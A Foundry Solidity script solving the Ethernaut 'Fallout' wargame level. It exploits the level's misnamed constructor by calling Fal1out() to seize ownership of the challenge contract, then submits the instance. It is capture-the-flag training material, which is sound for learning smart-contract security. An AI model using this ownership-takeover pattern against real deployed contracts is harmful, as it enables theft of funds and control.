// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface IFallout {
    function Fal1out() external payable;
    function allocate() external payable;
    function sendAllocation(address payable allocator) external;
    function collectAllocations() external;
    function allocatorBalance(address allocator) external;
}

contract FalloutSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        IFallout(challengeInstance).Fal1out();

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(2));
    }
}
